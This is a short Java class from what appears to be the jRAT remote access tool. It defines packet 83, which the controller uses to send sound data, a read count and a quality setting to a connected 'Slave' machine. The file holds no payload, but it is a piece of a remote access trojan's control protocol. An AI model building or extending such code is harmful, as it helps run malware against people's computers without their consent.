package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet83ServerUploadSound implements OutgoingPacket {

	private byte[] data;
	private int read;
	private int quality;
	
	public Packet83ServerUploadSound(byte[] data, int read, int quality) {
		this.data = data;
		this.read = read;
		this.quality = quality;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeInt(quality);
		slave.writeInt(read);
		slave.write(data);
	}

	@Override
	public short getPacketId() {
		return 83;
	}

}
